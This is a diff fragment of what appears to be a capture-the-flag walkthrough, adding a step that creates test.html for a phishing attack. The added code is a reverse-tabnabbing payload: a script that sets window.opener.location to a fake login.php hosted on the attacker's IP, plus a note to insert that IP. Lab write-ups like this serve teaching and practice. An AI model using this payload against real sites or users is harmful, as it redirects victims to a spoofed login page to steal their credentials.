@@ -64,5 +64,16 @@ Let's get our /admin/login.php page:<br>
 <center>
 <img src="./images/wget_login_php_napping.png">
 </center><br>
-And create test.html document for our phishing part:
+And create test.html document for our phishing part:<br>
+```bash
+<!DOCTYPE html>
+<html>
+   <body>
+      <script>
+         window.opener.location='http://10.11.147.142:8000/login.php';
+      </script>
+   </body>
+</html>
+```
+NOTE: You write your IP from the attacker mashine.<br>
 
